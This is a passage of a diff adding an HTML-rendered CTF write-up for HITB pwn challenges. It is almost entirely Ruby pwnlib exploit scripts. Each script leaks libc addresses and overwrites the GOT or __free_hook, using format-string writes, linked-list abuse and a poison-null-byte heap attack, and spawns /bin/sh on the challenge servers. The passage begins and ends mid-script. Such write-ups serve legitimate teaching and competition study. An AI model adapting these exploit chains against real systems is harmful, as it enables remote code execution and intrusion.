+  <span class="n">libc_base</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">got</span><span class="o">[</span><span class="s2">&quot;usleep&quot;</span><span class="o">]</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">-</span> <span class="n">libc_offset</span><span class="o">[</span><span class="s2">&quot;usleep&quot;</span><span class="o">]</span>
+  <span class="nb">puts</span> <span class="s2">&quot;libc base = 0x%x&quot;</span> <span class="o">%</span> <span class="n">libc_base</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] overwrite got&quot;</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">a</span> <span class="o">=</span> <span class="o">[]</span>
+  <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
+  <span class="o">[</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc_offset</span><span class="o">[</span><span class="s2">&quot;usleep&quot;</span><span class="o">]].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;L&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">bytes</span><span class="o">.</span><span class="n">zip</span><span class="p">(</span><span class="o">[</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc_offset</span><span class="o">[</span><span class="s2">&quot;one_gadget&quot;</span><span class="o">]].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;L&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">bytes</span><span class="p">)</span><span class="o">.</span><span class="n">each_with_index</span><span class="p">{</span><span class="o">|</span><span class="n">b</span><span class="p">,</span> <span class="n">i</span><span class="o">|</span>
+    <span class="k">if</span> <span class="n">b</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">==</span> <span class="n">b</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span>
+      <span class="k">next</span>
+    <span class="k">end</span>
+    <span class="k">if</span> <span class="n">b</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">!=</span> <span class="n">cnt</span>
+      <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;%</span><span class="si">#{</span><span class="p">(</span><span class="n">b</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">-</span> <span class="n">cnt</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="si">}</span><span class="s2">c&quot;</span>
+      <span class="n">cnt</span> <span class="o">=</span> <span class="n">b</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span>
+    <span class="k">end</span>
+    <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;%</span><span class="si">#{</span><span class="n">i</span> <span class="o">+</span> <span class="mi">22</span><span class="si">}</span><span class="s2">$hhn&quot;</span>
+    <span class="n">a</span> <span class="o">&lt;&lt;</span> <span class="n">got</span><span class="o">[</span><span class="s2">&quot;usleep&quot;</span><span class="o">]</span> <span class="o">+</span> <span class="n">i</span>
+  <span class="p">}</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x80</span> <span class="o">-</span> <span class="n">payload</span><span class="o">.</span><span class="n">length</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="n">a</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q*&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] launch shell&quot;</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span>
+
+  <span class="n">tube</span><span class="o">.</span><span class="n">interactive</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>flag: <code>HITB{Baby_Pwn_BabY_bl1nd}</code></p>
+<h2>once (Pwn 281pts)</h2>
+<p>Vulnerability:</p>
+<ul>
+<li>We can overwrite the last item of double-linked list</li>
+<li>The binary kindly tells us the address of libc</li>
+</ul>
+<p>Exploit:</p>
+<div class="codehilite"><pre><span class="c1">#coding:ascii-8bit</span>
+<span class="nb">require</span> <span class="s2">&quot;pwnlib&quot;</span>
+
+<span class="n">remote</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span>
+<span class="k">if</span> <span class="n">remote</span>
+  <span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;47.75.189.102&quot;</span>
+  <span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
+  <span class="n">libc_offset</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;puts&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x6f690</span><span class="p">,</span>
+    <span class="s2">&quot;__free_hook&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x3c67a8</span><span class="p">,</span>
+    <span class="s2">&quot;system&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x45390</span>
+  <span class="p">}</span>
+<span class="k">else</span>
+  <span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;localhost&quot;</span>
+  <span class="n">port</span> <span class="o">=</span> <span class="mi">54321</span>
+  <span class="n">libc_offset</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;puts&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x6f690</span><span class="p">,</span>
+    <span class="s2">&quot;__free_hook&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x3c67a8</span><span class="p">,</span>
+    <span class="s2">&quot;system&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x45390</span>
+  <span class="p">}</span>
+<span class="k">end</span>
+
+<span class="k">class</span> <span class="nc">PwnTube</span>
+  <span class="k">def</span> <span class="nf">recv_until_prompt</span>
+    <span class="n">recv_until</span><span class="p">(</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">tube</span>
+  <span class="vi">@tube</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">create</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">overwrite_last</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">))</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">delete_last</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">extra_menu</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;4&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">))</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until</span><span class="p">(</span><span class="s2">&quot;input size:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">size</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">write_data</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">))</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">free</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">quit_extra_menu</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;4&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="k">end</span>
+
+<span class="no">PwnTube</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">){</span><span class="o">|</span><span class="n">t</span><span class="o">|</span>
+  <span class="vi">@tube</span> <span class="o">=</span> <span class="n">t</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] leak libc base&quot;</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;0&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">))</span>
+  <span class="n">libc_base</span> <span class="o">=</span> <span class="n">tube</span><span class="o">.</span><span class="n">recv_capture</span><span class="p">(</span><span class="sr">/(0x[0-9a-f]{12})/</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="n">to_i</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc_offset</span><span class="o">[</span><span class="s2">&quot;puts&quot;</span><span class="o">]</span>
+  <span class="nb">puts</span> <span class="s2">&quot;libc base = 0x%x&quot;</span> <span class="o">%</span> <span class="n">libc_base</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] allocate buffer&quot;</span>
+  <span class="n">extra_menu</span>
+  <span class="n">alloc</span><span class="p">(</span><span class="mi">8000</span><span class="p">)</span>
+  <span class="n">quit_extra_menu</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] abuse linklist&quot;</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mh">0x18</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;</span><span class="se">\x54</span><span class="s2">&quot;</span>  <span class="c1"># partial overwrite</span>
+  <span class="n">overwrite_last</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+  <span class="n">create</span>
+  <span class="n">delete_last</span>  <span class="c1"># now we can call &quot;overwrite&quot; feature again :)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] overwrite buffer address&quot;</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc_offset</span><span class="o">[</span><span class="s2">&quot;__free_hook&quot;</span><span class="o">]</span> <span class="o">-</span> <span class="mi">8</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span>
+  <span class="n">overwrite_last</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] overwrite __free_hook&quot;</span>
+  <span class="n">extra_menu</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;/bin/sh&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc_offset</span><span class="o">[</span><span class="s2">&quot;system&quot;</span><span class="o">]].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span>
+  <span class="n">write_data</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] launch shell&quot;</span>
+  <span class="n">free</span>
+
+  <span class="n">tube</span><span class="o">.</span><span class="n">interactive</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>flag: <code>HITB{this_is_the_xxxxxxx_flag}</code></p>
+<h2>d (Pwn 392pts)</h2>
+<p>Vulnerability:</p>
+<ul>
+<li>When decoding base64, it doesn't null-terminate the string when input contains errors</li>
+</ul>
+<p>Exploit:</p>
+<div class="codehilite"><pre><span class="c1">#coding:ascii-8bit</span>
+<span class="nb">require</span> <span class="s2">&quot;pwnlib&quot;</span>
+<span class="nb">require</span> <span class="s2">&quot;base64&quot;</span>
+
+<span class="n">remote</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span>
+<span class="k">if</span> <span class="n">remote</span>
+  <span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;47.75.154.113&quot;</span>
+  <span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
+  <span class="n">libc_offset</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;__libc_start_main&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x20740</span><span class="p">,</span>
+    <span class="s2">&quot;system&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x45390</span>
+  <span class="p">}</span>
+<span class="k">else</span>
+  <span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;localhost&quot;</span>
+  <span class="n">port</span> <span class="o">=</span> <span class="mi">54321</span>
+  <span class="n">libc_offset</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;__libc_start_main&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x20740</span><span class="p">,</span>
+    <span class="s2">&quot;system&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x45390</span>
+  <span class="p">}</span>
+<span class="k">end</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="s2">&quot;read_integer&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x400f48</span><span class="p">,</span>
+  <span class="s2">&quot;puts&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x400770</span>
+<span class="p">}</span>
+
+<span class="n">got</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="s2">&quot;strlen&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x602028</span><span class="p">,</span>
+  <span class="s2">&quot;free&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x602018</span><span class="p">,</span>
+  <span class="s2">&quot;__libc_start_main&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x602050</span><span class="p">,</span>
+  <span class="s2">&quot;atoi&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x602068</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">PwnTube</span>
+  <span class="k">def</span> <span class="nf">recv_until_prompt</span>
+    <span class="n">recv_until</span><span class="p">(</span><span class="s2">&quot;Which? :&quot;</span><span class="p">)</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">tube</span>
+  <span class="vi">@tube</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">read_message</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">index</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until</span><span class="p">(</span><span class="s2">&quot;msg:&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">edit_message</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">index</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until</span><span class="p">(</span><span class="s2">&quot;new msg:&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">edit_message_hax</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">index</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until</span><span class="p">(</span><span class="s2">&quot;new msg:&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;-1&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">wipe_message</span><span class="p">(</span><span class="n">index</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">index</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="k">end</span>
+
+<span class="no">PwnTube</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">){</span><span class="o">|</span><span class="n">t</span><span class="o">|</span>
+  <span class="vi">@tube</span> <span class="o">=</span> <span class="n">t</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] fill heap with garbage&quot;</span>
+  <span class="n">read_message</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">)</span>
+  <span class="n">wipe_message</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] create messages&quot;</span>
+  <span class="n">read_message</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x80\n</span><span class="s2">&quot;</span><span class="p">)</span>  <span class="c1"># chunk 0x20</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;</span><span class="se">\xff</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mh">0x1f0</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0x200</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span>
+  <span class="n">read_message</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="no">Base64</span><span class="o">.</span><span class="n">encode64</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="sr">/\s/</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x2b4</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x80</span><span class="s2">&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>  <span class="c1"># chunk 0x210</span>
+  <span class="n">read_message</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x80</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mh">0x15f</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>  <span class="c1"># chunk 0x110</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] free No.2&quot;</span>
+  <span class="n">wipe_message</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+  <span class="c1"># poison null byte</span>
+  <span class="nb">puts</span> <span class="s2">&quot;[*] overwrite No.2-&gt;size&quot;</span>
+  <span class="n">edit_message</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\xff</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] create message&quot;</span>
+  <span class="n">read_message</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x80</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mh">0x149</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+  <span class="n">read_message</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x80</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mh">0x89</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>  <span class="c1"># chunk which will be forgotten</span>
+  <span class="n">read_message</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x80</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mh">0xb4</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>  <span class="c1"># chunk which will be forgotten</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] free No.3, No.2&quot;</span>
+  <span class="n">wipe_message</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+  <span class="n">wipe_message</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] free No.4 (victim)&quot;</span>
+  <span class="n">wipe_message</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] overwrite victim chunk&quot;</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;</span><span class="se">\xff</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mh">0xf8</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0x70</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0x60216d</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span>  <span class="c1"># fd</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;</span><span class="se">\xff</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mh">0x60</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span>
+  <span class="n">read_message</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="no">Base64</span><span class="o">.</span><span class="n">encode64</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="sr">/\s/</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] overwrite bss&quot;</span>
+  <span class="n">read_message</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x80</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mh">0x89</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+  <span class="n">read_message</span><span class="p">(</span><span class="mi">63</span><span class="p">,</span> <span class="no">Base64</span><span class="o">.</span><span class="n">encode64</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\xff</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mh">0x60</span><span class="p">)</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="sr">/\s/</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x89</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x80</span><span class="s2">&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
